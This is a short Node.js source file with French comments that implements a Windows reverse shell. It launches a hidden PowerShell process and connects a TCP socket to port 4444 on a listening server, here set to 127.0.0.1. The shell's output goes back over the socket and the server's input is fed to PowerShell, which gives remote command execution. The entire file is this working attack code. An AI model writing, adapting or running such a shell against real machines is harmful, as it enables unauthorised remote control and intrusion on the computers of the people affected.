const net = require('net');

//On déclare un nouveau socket et un nouveau processus enfant qui spawn un powershell
var client = new net.Socket()
const spawn = require('child_process').spawn;

var process = spawn('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', {windowsHide: true})
//process.unref()
//on se connecte à l'adresse et au port sur le serveur d'écoute IPV4 UNIQUEMENT
client.connect(4444, "127.0.0.1", function (err, socket) {
    if (err) {
        console.error(err);
        return
    }
})
//on reçoit sur le serveur la sortie du client
process.stdout.on('data', function (chunk) {
    client.write(chunk)
})
//on reçoit sur le serveur la sortie erreur du client
process.stderr.on('data', function (chunk) {
    client.write(chunk)
})
//on envoie l'entrée du serveur au processus du client
client.on("data", function(data) {
    process.stdin.write(data)
})